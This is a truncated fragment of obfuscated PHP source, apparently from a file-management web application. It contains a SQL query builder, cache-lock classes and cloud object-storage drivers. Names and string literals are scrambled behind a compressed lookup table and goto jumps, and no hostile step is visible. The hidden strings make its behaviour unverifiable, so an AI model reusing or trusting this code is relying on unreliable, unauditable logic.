$€Ì¦ôÌ[$²İ›ÔË™[358]]; $şƒê›†é = $this->buildSelectSql($€Ì¦ôÌ); $¶°¯ù¯¼ = isset($€Ì¦ôÌ[$²İ›ÔË™[425]]) ? $€Ì¦ôÌ[$²İ›ÔË™[425]] : !1; if ($¶°¯ù¯¼) { $ı­á“±´ = is_string($¶°¯ù¯¼[$²İ›ÔË™[97]]) ? $¶°¯ù¯¼[$²İ›ÔË™[97]] : $²İ›ÔË™[1118] . md5($şƒê›†é); $¢û¯ıæØ = think_cache($ı­á“±´, $²İ›ÔË™[12], $¶°¯ù¯¼); if (!1 !== $¢û¯ıæØ) { return $¢û¯ıæØ; } } $Ó×“×Ö§ = $this->query($şƒê›†é, $this->parseBind(!empty($€Ì¦ôÌ[$²İ›ÔË™[361]]) ? $€Ì¦ôÌ[$²İ›ÔË™[361]] : array())); if ($¶°¯ù¯¼ && !1 !== $Ó×“×Ö§) { think_cache($ı­á“±´, $Ó×“×Ö§, $¶°¯ù¯¼); } return $Ó×“×Ö§; } public function buildSelectSql($Õ¾å£¹­ = array()) { $ãåÂë¹² =& $_SERVER[³Ôà×Ó]; if (isset($Õ¾å£¹­[$ãåÂë¹²[429]])) { if (strpos($Õ¾å£¹­[$ãåÂë¹²[429]], $ãåÂë¹²[50])) { list($Ùˆ†¡Õ¡, $øÓË¤í) = explode($ãåÂë¹²[50], $Õ¾å£¹­[$ãåÂë¹²[429]]); } else { $Ùˆ†¡Õ¡ = $Õ¾å£¹­[$ãåÂë¹²[429]]; } $Ùˆ†¡Õ¡ = $Ùˆ†¡Õ¡ ? $Ùˆ†¡Õ¡ : 1; $øÓË¤í = isset($øÓË¤í) ? $øÓË¤í : (is_numeric($Õ¾å£¹­[$ãåÂë¹²[368]]) ? $Õ¾å£¹­[$ãåÂë¹²[368]] : 20); $ûß½›Õ = $øÓË¤í * ((int) $Ùˆ†¡Õ¡ - 1); $Õ¾å£¹­[$ãåÂë¹²[368]] = $ûß½›Õ . $ãåÂë¹²[50] . $øÓË¤í; } if (think_config($ãåÂë¹²[1119])) { $õ€—…Ãâ = $ãåÂë¹²[1120] . md5(serialize($Õ¾å£¹­)); $İìØËèù = think_cache($õ€—…Ãâ); if ($İìØËèù) { return $İìØËèù; } } $Ì’äˆÍÓ = $this->parseSql($this->selectSql, $Õ¾å£¹­); $Ì’äˆÍÓ .= $this->parseLock(isset($Õ¾å£¹­[$ãåÂë¹²[918]]) ? $Õ¾å£¹­[$ãåÂë¹²[918]] : !1); if (isset($õ€—…Ãâ)) { think_cache($õ€—…Ãâ, $Ì’äˆÍÓ); } return $Ì’äˆÍÓ; } public function parseSql($âôÁë”—, $¬×š’õĞ = array()) { $ÅÇ¯ˆÚ¡ =& $_SERVER[³Ôà×Ó]; $âôÁë”— = str_replace(array($ÅÇ¯ˆÚ¡[1121], $ÅÇ¯ˆÚ¡[1122], $ÅÇ¯ˆÚ¡[1123], $ÅÇ¯ˆÚ¡[1124], $ÅÇ¯ˆÚ¡[1125], $ÅÇ¯ˆÚ¡[1126], $ÅÇ¯ˆÚ¡[1127], $ÅÇ¯ˆÚ¡[1128], $ÅÇ¯ˆÚ¡[1129], $ÅÇ¯ˆÚ¡[1130], $ÅÇ¯ˆÚ¡[1131]), array($this->parseTable("{$¬×š’õĞ[$ÅÇ¯ˆÚ¡[356]]}"), $this->parseDistinct(isset($¬×š’õĞ[$ÅÇ¯ˆÚ¡[1132]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[1132]] : !1), $this->parseField(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[350]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[350]] : $ÅÇ¯ˆÚ¡[220]), $this->parseJoin(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[359]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[359]] : $ÅÇ¯ˆÚ¡[12]), $this->parseWhere(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[352]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[352]] : $ÅÇ¯ˆÚ¡[12]), $this->parseGroup(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[587]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[587]] : $ÅÇ¯ˆÚ¡[12]), $this->parseHaving(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[1133]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[1133]] : $ÅÇ¯ˆÚ¡[12]), $this->parseOrder(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[450]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[450]] : $ÅÇ¯ˆÚ¡[12]), $this->parseLimit(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[368]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[368]] : $ÅÇ¯ˆÚ¡[12]), $this->parseUnion(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[423]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[423]] : $ÅÇ¯ˆÚ¡[12]), $this->parseComment(!empty($¬×š’õĞ[$ÅÇ¯ˆÚ¡[430]]) ? $¬×š’õĞ[$ÅÇ¯ˆÚ¡[430]] : $ÅÇ¯ˆÚ¡[12])), $âôÁë”—); return $âôÁë”—; } public function getLastSql($ğè÷£¶¦ = '') { return $ğè÷£¶¦ ? $this->modelSql[$ğè÷£¶¦] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ƒÊˆÃ®) { return addslashes($ƒÊˆÃ®); } public function setModel($ôÀëàƒâ) { $this->model = $ôÀëàƒâ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto B‘ŞÅ£¢÷Ò; fñŞáêàì: define($_SERVER[³Ôà×Ó][0], $_SERVER[³Ôà×Ó][1]); $_SERVER[¿¨Â¬] = explode($_SERVER[³Ôà×Ó][2], gzinflate(substr($_SERVER[³Ôà×Ó][3], 10, -8))); function binCheckEq($ĞâŠ¬—‹, $åóü¼ª) { return $ĞâŠ¬—‹ == $åóü¼ª; } goto f ¥‡î§İõ; D¤ÉˆÄÔ: class CacheLockRedis { public function lock($É•í·–, $ÕüÍŸğ = 10) { $ùôÂé” = Cache::init(); $·ˆŠÍŞÙ = microtime(!0) + $ÕüÍŸğ; while (microtime(!0) < $·ˆŠÍŞÙ) { $Áºî¾ÉÖ = $ùôÂé”->get($É•í·–); if (!$Áºî¾ÉÖ) { $¢ËïÛ»† = $ùôÂé”->setLock($É•í·–, $·ˆŠÍŞÙ, $ÕüÍŸğ); if ($¢ËïÛ»†) { return !0; } } else { if ($Áºî¾ÉÖ < microtime(!0)) { $ùôÂé”->set($É•í·–, $·ˆŠÍŞÙ, $ÕüÍŸğ * 2); if ($ùôÂé”->get($É•í·–) === $Áºî¾ÉÖ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($·‘ŞÄ×) { return Cache::init()->get($·‘ŞÄ×); } public function unlock($× Œç÷È) { return Cache::init()->remove($× Œç÷È); } } class CacheLockMemcached { public function lock($Øë¥äùŠ, $ÆµÉÀÍì = 0) { $Ÿ³õÔ‰† = Cache::init(); $üÓ§Şú¦ = microtime(!0) + $ÆµÉÀÍì; while (microtime(!0) < $üÓ§Şú¦) { $¯€ Åæ = $Ÿ³õÔ‰†->get($Øë¥äùŠ); if (!$¯€ Åæ || $¯€ Åæ < microtime(!0)) { $Š›ªÏŒ• = $Ÿ³õÔ‰†->handle->add($Øë¥äùŠ, $üÓ§Şú¦, $ÆµÉÀÍì); if ($Š›ªÏŒ•) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($—±ÀŸØ°) { return Cache::init()->get($—±ÀŸØ°); } public function unlock($Œ¢…œ¬ï) { return Cache::init()->remove($Œ¢…œ¬ï); } } class CacheLockDatabase { public function lock($‡‡²Ç•Ò, $ğêœ¤Úö = 0) { $¢ˆâı§‡ = Model($_SERVER[³Ôà×Ó][903]); $ÕŞÙëÌ = microtime(!0) + $ğêœ¤Úö; while (microtime(!0) < $ÕŞÙëÌ) { $È‰¦®ú£ = $¢ˆâı§‡->get($‡‡²Ç•Ò); if (!$È‰¦®ú£ || $È‰¦®ú£ < microtime(!0)) { $‚•¯ ´ = $¢ˆâı§‡->set($‡‡²Ç•Ò, $ÕŞÙëÌ); if ($‚•¯ ´) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ØëÔëıç) { return Model($_SERVER[³Ôà×Ó][903])->get($ØëÔëıç); } public function unlock($ÏâÍ—ƒ¾) { Model($_SERVER[³Ôà×Ó][903])->remove($ÏâÍ—ƒ¾); } } goto f‘Ñ¦áìî; a—¬Õ÷ˆÃœ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÖŞÄÔ¯Ù) { parent::__construct($ÖŞÄÔ¯Ù); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } public function fileOutLink($ı€È¤Áô) { $¢’à¨Æ® =& $_SERVER[³Ôà×Ó]; if (substr($ı€È¤Áô, 0, 7) == $¢’à¨Æ®[313]) { $ı€È¤Áô = $¢’à¨Æ®[314] . substr($ı€È¤Áô, 7); } header($¢’à¨Æ®[175] . $ı€È¤Áô); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($‚ë£˜) { parent::__construct(); include_once SDK_DIR . $_SERVER[³Ôà×Ó][1457]; $this->_init($‚ë£˜); } public function _init($Ñ¶çúÔ¢) { $—¼¢åÃ =& $_SERVER[³Ôà×Ó]; $this->config = $Ñ¶çúÔ¢; foreach ($Ñ¶çúÔ¢ as $®£§öÄ¤ => $Íö¥£ ”) { if (isset($this->{$®£§öÄ¤})) { $this->{$®£§öÄ¤} = $Íö¥£ ”; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($—¼¢åÃ[1458] . LNG($—¼¢åÃ[1459])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $åÁÃ‚« =& $_SERVER[³Ôà×Ó]; $Šñ½š‰Æ = new OSS\Model\CorsConfig(); $ØŒÇ»Ÿ‚ = new OSS\Model\CorsRule(); $ØŒÇ»Ÿ‚->addAllowedOrigin($åÁÃ‚«[1460]); $ØŒÇ»Ÿ‚->addAllowedMethod($åÁÃ‚«[1461]); $ØŒÇ»Ÿ‚->addAllowedMethod($åÁÃ‚«[1462]); $ØŒÇ»Ÿ‚->addAllowedMethod($åÁÃ‚«[1463]); $ØŒÇ»Ÿ‚->addAllowedMethod($åÁÃ‚«[1464]); $ØŒÇ»Ÿ‚->addAllowedMethod($åÁÃ‚«[165]); $ØŒÇ»Ÿ‚->setMaxAgeSeconds(600); $ØŒÇ»Ÿ‚->addExposeHeader($åÁÃ‚«[1465]); $ØŒÇ»Ÿ‚->addAllowedHeader($åÁÃ‚«[1460]); $Šñ½š‰Æ->addRule($ØŒÇ»Ÿ‚); try { $this->client->putBucketCors($this->bucket, $Šñ½š‰Æ); } catch (OSS\Core\OssException $£¶ÌØ¢§) { $this->writeLog(__FUNCTION__ . $åÁÃ‚«[214] . $£¶ÌØ¢§->getMessage()); return !1; } return !0; } public function getBucketCors() { $³èËÑÈ… =& $_SERVER[³Ôà×Ó]; $¯¯ŠÒ‚ó = null; try { $¯¯ŠÒ‚ó = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $©à­Åâ) { $this->writeLog(__FUNCTION__ . $³èËÑÈ…[214] . $©à­Åâ->getMessage()); return null; } if (!$¯¯ŠÒ‚ó || !($Ù‚‹ò„ğ = $¯¯ŠÒ‚ó->getRules())) { return null; } $±ü«³ïù = $Ù‚‹ò„ğ[0]->getAllowedOrigins(); $¨®Ÿ‚ÛÄ = $Ù‚‹ò„ğ[0]->getAllowedMethods(); $À¢‡ß’ = $Ù‚‹ò„ğ[0]->getMaxAgeSeconds(); $šûîÁç = $Ù‚‹ò„ğ[0]->getExposeHeaders(); $€åçÚ = $Ù‚‹ò„ğ[0]->getAllowedHeaders(); return array($³èËÑÈ…[218] => isset($±ü«³ïù[0]) ? $±ü«³ïù[0] : $³èËÑÈ…[12], $³èËÑÈ…[222] => $¨®Ÿ‚ÛÄ, $³èËÑÈ…[1466] => $À¢‡ß’, $³èËÑÈ…[1467] => isset($šûîÁç[0]) ? $šûîÁç[0] : $³èËÑÈ…[12], $³èËÑÈ…[219] => isset($€åçÚ[0]) ? $€åçÚ[0] : $³èËÑÈ…[12]); } public function isBucketCors() { $¼ìëÄ‘› =& $_SERVER[³Ôà×Ó]; $‡²ÃÒìş = $this->getBucketCors(); if (!$‡²ÃÒìş || !is_array($‡²ÃÒìş)) { return !1; } if ($‡²ÃÒìş[$¼ìëÄ‘›[218]] != $¼ìëÄ‘›[220] || $‡²ÃÒìş[$¼ìëÄ‘›[219]] != $¼ìëÄ‘›[220]) { return !1; } $‚‡­ì×º = array_map($¼ìëÄ‘›[221], $‡²ÃÒìş[$¼ìëÄ‘›[222]]); if (!is_array($‚‡­ì×º)) { $‚‡­ì×º = array(); } $¿£Òœ¡ = array($¼ìëÄ‘›[223], $¼ìëÄ‘›[224], $¼ìëÄ‘›[225], $¼ìëÄ‘›[226], $¼ìëÄ‘›[227]); $òÛË”â = array_diff($¿£Òœ¡, $‚‡­ì×º); return empty($òÛË”â); } public function mkfile($ÕøµóĞú, $±¯ÚßÙ» = '', $Ÿ™©ì¿Ã = REPEAT_RENAME) { $ºŸûØâ° = $this->setContent($ÕøµóĞú, $±¯ÚßÙ»); if ($ºŸûØâ° !== !1) { return $this->getPathOuter($ÕøµóĞú); } return !1; } public function mkdir($ÄÓ·íü, $°ÉğŞ€« = REPEAT_SKIP) { if ($°ÉğŞ€« && $this->_isFolder($ÄÓ·íü)) { return $this->getPathOuter($ÄÓ·íü); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÄÓ·íü)); } catch (OSS\Core\OssException $ê•ÅşÆÜ) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $ê•ÅşÆÜ->getMessage()); return !1; } return $this->getPathOuter($ÄÓ·íü); } private function fileList($÷âÕ…Î¥, $Û…±ø·Î = '', $çÙŸö¬ = 0) { $é…¢áÄè =& $_SERVER[³Ôà×Ó]; $÷âÕ…Î¥ = trim($÷âÕ…Î¥, $é…¢áÄè[8]); $™ âëÅÛ = empty($÷âÕ…Î¥) && $÷âÕ…Î¥ !== $é…¢áÄè[228] ? $é…¢áÄè[12] : $÷âÕ…Î¥ . $é…¢áÄè[8]; $âÅùÑùĞ = $é…¢áÄè[12]; $ÈÂ©°Ç‡ = 1000; $°û‡¹Œ = $Éó–è–û = array(); while (!0) { check_abort(); $Ê™ÈËù = array($é…¢áÄè[1468] => $Û…±ø·Î, $é…¢áÄè[1469] => $™ âëÅÛ, $é…¢áÄè[1470] => $ÈÂ©°Ç‡, $é…¢áÄè[1471] => $âÅùÑùĞ); try { $Ûè§Âæ = $this->client->listObjects($this->bucket, $Ê™ÈËù); } catch (OSS\Core\OssException $ºŞÅíÔ) { $this->writeLog(__FUNCTION__ . $é…¢áÄè[214] . $ºŞÅíÔ->getMessage()); break; } $âÅùÑùĞ = $Ûè§Âæ->getNextMarker(); $æÒûÎÏ¡ = $Ûè§Âæ->getObjectList(); $”ï¡ÖÜÀ = $Ûè§Âæ->getPrefixList(); foreach ($æÒûÎÏ¡ as $Ç™ö™à) { if ($Ç™ö™à->getKey() == $™ âëÅÛ) { continue; } $—ƒ»‘ıª = $Ç™ö™à->getKey(); $€äÄÓ÷ = $Ç™ö™à->getSize(); $¼İŠÂõ = $Ç™ö™à->getLastModified(); $‘Ôòœ®´ = trim($Ç™ö™à->getETag(), $é…¢áÄè[121]); $ÉÏÀ›› = $çÙŸö¬ ? array($é…¢áÄè[32] => $—ƒ»‘ıª, $é…¢áÄè[79] => $€äÄÓ÷, $é…¢áÄè[206] => strtotime($¼İŠÂõ), $é…¢áÄè[1472] => $‘Ôòœ®´) : $—ƒ»‘ıª; $¾ê‹í·† = $€äÄÓ÷ == 0 && substr($—ƒ»‘ıª, strlen($—ƒ»‘ıª) - 1, 1) == $é…¢áÄè[8] ? !0 : !1; $ˆÈÏîå = array($é…¢áÄè[79] => $€äÄÓ÷, $é…¢áÄè[1473] => $€äÄÓ÷, $é…¢áÄè[88] => strtotime($¼İŠÂõ), $é…¢áÄè[1474] => $¼İŠÂõ, $é…¢áÄè[1472] => $‘Ôòœ®´); $this->cacheMethodInfoSet($—ƒ»‘ıª, $¾ê‹í·†, $ˆÈÏîå); if ($¾ê‹í·†) { $°û‡¹Œ[] = $—ƒ»‘ıª; continue; } $Éó–è–û[] = $ÉÏÀ››; } foreach ($”ï¡ÖÜÀ as $àªéÌÇè) { $°û‡¹Œ[] = $àªéÌÇè->getPrefix(); $this->cacheMethodInfoSet($àªéÌÇè->getPrefix(), !0); } if ($âÅùÑùĞ === $é…¢áÄè[12]) { break; } } $this->cacheMethodInfoSet($÷âÕ…Î¥, !0); return array($é…¢áÄè[85] => $°û‡¹Œ, $é…¢áÄè[86] => $Éó–è–û); } public function listObject($°Æ¨Á‡Ï, $ŞÔğç‚™ = '') { $’Ëıçü¾ =& $_SERVER[³Ôà×Ó]; $°Æ¨Á‡Ï = trim($°Æ¨Á‡Ï, $’Ëıçü¾[8]); $°Î‹®“ = empty($°Æ¨Á‡Ï) && $°Æ¨Á‡Ï !== $’Ëıçü¾[228] ? $’Ëıçü¾[12] : $°Æ¨Á‡Ï . $’Ëıçü¾[8]; $ıÌ¥Ø®¸ = $’Ëıçü¾[12]; $¡¿Ó˜şà = 1000; $ÇúÍÎØò = $úì™¦öİ = array(); while (!0) { check_abort(); $Ëõ£×”ş = array($’Ëıçü¾[1468] => $ŞÔğç‚™, $’Ëıçü¾[1469] => $°Î‹®“, $’Ëıçü¾[1470] => $¡¿Ó˜şà, $’Ëıçü¾[1471] => $ıÌ¥Ø®¸); try { $ÙïÔ™ = $this->client->listObjects($this->bucket, $Ëõ£×”ş); } catch (OSS\Core\OssException $Û³À‘®´) { $this->writeLog(__FUNCTION__ . $’Ëıçü¾[214] . $Û³À‘®´->getMessage()); break; } $ıÌ¥Ø®¸ = $ÙïÔ™->getNextMarker(); $íÆÚˆÂ¹ = $ÙïÔ™->getObjectList(); foreach ($íÆÚˆÂ¹ as $ó¬ÑÒı) { if ($ó¬ÑÒı->getKey() == $°Î‹®“) { continue; } $ÕäåØ‚± = $ó¬ÑÒı->getKey(); $’úÍÛŞë = $ó¬ÑÒı->getSize(); $‰Å†»…î = $’úÍÛŞë == 0 && substr($ÕäåØ‚±, strlen($ÕäåØ‚±) - 1, 1) == $’Ëıçü¾[8] ? !0 : !1; if ($‰Å†»…î) { continue; } (yield $’úÍÛŞë . $’Ëıçü¾[214] . $ÕäåØ‚±); } if ($ıÌ¥Ø®¸ === $’Ëıçü¾[12]) { break; } } } public function copyFile($ÙëöğÓ›, $Òè»¶­) { $±˜ª÷¤ = $this->size($ÙëöğÓ›); if ($±˜ª÷¤ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÙëöğÓ›, $this->bucket, $this->pathEncode($Òè»¶­)); } catch (OSS\Core\OssException $Êû÷Ù¡É) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $Êû÷Ù¡É->getMessage()); return !1; } return $this->getPathOuter($Òè»¶­); } $¶’àñè = $this->multiCopyObject($ÙëöğÓ›, $Òè»¶­, $±˜ª÷¤); return $¶’àñè ? $this->getPathOuter($Òè»¶­) : !1; } private function multiCopyObject($ŞÎÆñÕ§, $Á›¼Şï¼, $Æü×®öş) { $ã¨âÙç =& $_SERVER[³Ôà×Ó]; try { $ˆà³“ıò = array(); if ($±ÜãŞÜ = $this->hashMd5($ŞÎÆñÕ§)) { $ˆà³“ıò = array(OSS\OssClient::OSS_HEADERS => array($ã¨âÙç[1475] => $±ÜãŞÜ)); } $šŞÅ³¯ı = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Á›¼Şï¼), $ˆà³“ıò); $ÂÈÅ›„Š = 1; $çºû£àñ = 0; $µİìõğ° = array(); $ıÍ‡Ñú´ = 1024 * 1024 * 10; $‘»øœ¡ = $this->client->generateMultiuploadParts($Æü×®öş, $ıÍ‡Ñú´); foreach ($‘»øœ¡ as $®‡ú¹îÄ => $Ê­´¶”) { $‹¬ÏŒ– = $çºû£àñ + (int) $Ê­´¶”[$ã¨âÙç[1476]]; $í¡ÛÜÂ» = (int) $Ê­´¶”[$ã¨âÙç[413]] + $‹¬ÏŒ– - 1; $”ù©÷ = array($ã¨âÙç[167] => $‹¬ÏŒ–, $ã¨âÙç[168] => $í¡ÛÜÂ»); $µİìõğ°[] = $this->client->uploadPartCopy($this->bucket, $ŞÎÆñÕ§, $this->bucket, $this->pathEncode($Á›¼Şï¼), $ÂÈÅ›„Š, $šŞÅ³¯ı, $”ù©÷); $ÂÈÅ›„Š = $ÂÈÅ›„Š + 1; } $ü¡¸Ä® = array(); foreach ($µİìõğ° as $®‡ú¹îÄ => $êÀË‰Ñ ) { $ü¡¸Ä®[] = array($ã¨âÙç[308] => $®‡ú¹îÄ + 1, $ã¨âÙç[309] => $êÀË‰Ñ ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Á›¼Şï¼), $šŞÅ³¯ı, $ü¡¸Ä®); } catch (OSS\Core\OssException $«ãŠşË) { $this->writeLog(__FUNCTION__ . $ã¨âÙç[214] . $«ãŠşË->getMessage()); return !1; } return !0; } public function moveFile($ò­¯„âÁ, $…óæ›„) { if ($this->copyFile($ò­¯„âÁ, $…óæ›„)) { $this->remove($ò­¯„âÁ); return $this->getPathOuter($…óæ›„); } return !1; } public function delFile($æÜÆ ä¢) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($æÜÆ ä¢)); } catch (OSS\Core\OssException $–¦É´®É) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $–¦É´®É->getMessage()); return !1; } return !0; } public function delFolder($³“Àû) { $úŞŒÚâ =& $_SERVER[³Ôà×Ó]; if (!$this->exist($³“Àû)) { return !0; } $this->listItemCache = !1; $éëÒóºÀ = $this->fileList($³“Àû); $this->listItemCache = !0; $´ãë › = trim($³“Àû, $úŞŒÚâ[8]) . $úŞŒÚâ[8]; if (!empty($³“Àû) && $³“Àû !== $úŞŒÚâ[228] && !in_array($´ãë ›, $éëÒóºÀ[$úŞŒÚâ[85]])) { $éëÒóºÀ[$úŞŒÚâ[85]][] = $´ãë ›; } $ıÖ¢òËÆ = $this->delByBatch($éëÒóºÀ[$úŞŒÚâ[86]]); if (!$ıÖ¢òËÆ) { return !1; } $ıÖ¢òËÆ = $this->delByBatch($éëÒóºÀ[$úŞŒÚâ[85]]); if (!$ıÖ¢òËÆ) { return !1; } return $this->delFile($´ãë ›); } private function delByBatch($œçÑ£›Ä) { foreach (array_chunk($œçÑ£›Ä, 1000) as $¼ŠŸªË—) { try { $this->client->deleteObjects($this->bucket, $¼ŠŸªË—); } catch (OSS\Core\OssException $ØÙÚÄåÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $ØÙÚÄåÊ->getMessage()); return !1; } } return !0; } public function rename($ôÜéŸœå, $Šúè«ëÑ) { return $this->renameObject($ôÜéŸœå, $Šúè«ëÑ); } private function fileInfo($Óê²¿Ãç, $³À÷ÅÀø = false, $ùã‹¾Âú = array()) { $ş¿Ê´êà =& $_SERVER[³Ôà×Ó]; $›ƒî» = array($ş¿Ê´êà[32] => $this->pathThis($Óê²¿Ãç), $ş¿Ê´êà[87] => $this->getPathOuter($Óê²¿Ãç), $ş¿Ê´êà[33] => $ş¿Ê´êà[230], $ş¿Ê´êà[79] => isset($ùã‹¾Âú[$ş¿Ê´êà[79]]) ? $ùã‹¾Âú[$ş¿Ê´êà[79]] : 0, $ş¿Ê´êà[169] => $this->ext($Óê²¿Ãç)); if ($³À÷ÅÀø) { return $›ƒî»; } $›ƒî»[$ş¿Ê´êà[231]] = $›ƒî»[$ş¿Ê´êà[88]] = 0; $›ƒî»[$ş¿Ê´êà[232]] = $›ƒî»[$ş¿Ê´êà[233]] = !0; if (empty($ùã‹¾Âú)) { $ÒÄ…œ‰ = $this->objectMeta($Óê²¿Ãç); if (!$ÒÄ…œ‰) { return $›ƒî»; } $ùã‹¾Âú = array($ş¿Ê´êà[88] => strtotime($ÒÄ…œ‰[$ş¿Ê´êà[1474]]), $ş¿Ê´êà[79] => $ÒÄ…œ‰[$ş¿Ê´êà[1473]] + 0, $ş¿Ê´êà[1472] => $ÒÄ…œ‰[$ş¿Ê´êà[1472]]); } if (isset($ùã‹¾Âú[$ş¿Ê´êà[1472]]) && $ùã‹¾Âú[$ş¿Ê´êà[1472]]) { $›ƒî»[$ş¿Ê´êà[235]] = trim($ùã‹¾Âú[$ş¿Ê´êà[1472]], $ş¿Ê´êà[121]); } if (isset($ùã‹¾Âú[$ş¿Ê´êà[79]])) { $›ƒî»[$ş¿Ê´êà[79]] = $ùã‹¾Âú[$ş¿Ê´êà[79]]; } if (isset($ùã‹¾Âú[$ş¿Ê´êà[88]])) { $›ƒî»[$ş¿Ê´êà[88]] = $ùã‹¾Âú[$ş¿Ê´êà[88]]; } if (isset($ùã‹¾Âú[$ş¿Ê´êà[206]]) && !trim($›ƒî»[$ş¿Ê´êà[88]])) { $›ƒî»[$ş¿Ê´êà[88]] = $ùã‹¾Âú[$ş¿Ê´êà[206]]; } return $›ƒî»; } private function folderInfo($ßĞ«ÙĞ³, $ñÔ¼à²û = false, $€ÀÀÕßå = array()) { $´üÆÒ›û =& $_SERVER[³Ôà×Ó]; $ªŸä¿‘¾ = array($´üÆÒ›û[32] => $this->pathThis($ßĞ«ÙĞ³), $´üÆÒ›û[87] => $this->getPathOuter($´üÆÒ›û[8] . $ßĞ«ÙĞ³), $´üÆÒ›û[33] => $´üÆÒ›û[78]); if ($ñÔ¼à²û) { return $ªŸä¿‘¾; } $ªŸä¿‘¾[$´üÆÒ›û[231]] = $ªŸä¿‘¾[$´üÆÒ›û[88]] = 0; $ªŸä¿‘¾[$´üÆÒ›û[232]] = $ªŸä¿‘¾[$´üÆÒ›û[233]] = !0; if (empty($€ÀÀÕßå)) { $ßĞ«ÙĞ³ = rtrim($ßĞ«ÙĞ³, $´üÆÒ›û[8]) . $´üÆÒ›û[8]; $ÀŒéâ§ = $this->objectMeta($ßĞ«ÙĞ³); if (!$ÀŒéâ§) { return $ªŸä¿‘¾; } $€ÀÀÕßå = array($´üÆÒ›û[231] => $ÀŒéâ§[$´üÆÒ›û[584]][$´üÆÒ›û[1477]], $´üÆÒ›û[88] => strtotime($ÀŒéâ§[$´üÆÒ›û[1474]])); } if (isset($€ÀÀÕßå[$´üÆÒ›û[88]])) { $ªŸä¿‘¾[$´üÆÒ›û[88]] = $€ÀÀÕßå[$´üÆÒ›û[88]]; } if (isset($€ÀÀÕßå[$´üÆÒ›û[231]])) { $ªŸä¿‘¾[$´üÆÒ›û[231]] = $€ÀÀÕßå[$´üÆÒ›û[231]]; } return $ªŸä¿‘¾; } public function listPath($®÷°ß²ù, $æÁ™Ÿ˜£ = false) { $ÈîÙÆşî =& $_SERVER[³Ôà×Ó]; $»™À‰ğ÷ = $this->fileList($®÷°ß²ù, $ÈîÙÆşî[8], !0); foreach ($»™À‰ğ÷[$ÈîÙÆşî[85]] as $¸ÁùÛ‡© => $çÒù†şƒ) { $»™À‰ğ÷[$ÈîÙÆşî[85]][$¸ÁùÛ‡©] = $this->folderInfo($çÒù†şƒ, $æÁ™Ÿ˜£, $çÒù†şƒ); } foreach ($»™À‰ğ÷[$ÈîÙÆşî[86]] as $¸ÁùÛ‡© => $çÒù†şƒ) { $»™À‰ğ÷[$ÈîÙÆşî[86]][$¸ÁùÛ‡©] = $this->fileInfo($çÒù†şƒ[$ÈîÙÆşî[32]], $æÁ™Ÿ˜£, $çÒù†şƒ); } return $»™À‰ğ÷; } protected function infoChildren($“Ì íˆ•, &$’Øöº¥ß) { $²º¦ÔŸ’ =& $_SERVER[³Ôà×Ó]; $õßˆªğÓ = $this->fileList($“Ì íˆ•, $²º¦ÔŸ’[12], !0); $’Øöº¥ß[$²º¦ÔŸ’[81]] += count($õßˆªğÓ[$²º¦ÔŸ’[85]]); $’Øöº¥ß[$²º¦ÔŸ’[80]] += count($õßˆªğÓ[$²º¦ÔŸ’[86]]); foreach ($õßˆªğÓ[$²º¦ÔŸ’[86]] as $¸œÚÃ—) { if (!$¸œÚÃ— || !$¸œÚÃ—[$²º¦ÔŸ’[79]]) { continue; } $’Øöº¥ß[$²º¦ÔŸ’[79]] += $¸œÚÃ—[$²º¦ÔŸ’[79]]; } } public function has($ŠÈÓîÕå, $“÷»•ˆŒ = false, $–¦÷Ä¦ = true) { $ÁªşÀöé =& $_SERVER[³Ôà×Ó]; $ŠÈÓîÕå = trim($ŠÈÓîÕå, $ÁªşÀöé[8]); $ù¾æ–àÓ = empty($ŠÈÓîÕå) && $ŠÈÓîÕå !== $ÁªşÀöé[228] ? $ÁªşÀöé[12] : $ŠÈÓîÕå . $ÁªşÀöé[8]; $¡ĞìÒÒÒ = $ÁªşÀöé[12]; $æ¶ÌÈ×É = 500; $ìÃİë»¿ = $Ìâ¶ášÌ = 0; while (!0) { check_abort(); $ €ñšûò = array($ÁªşÀöé[1468] => 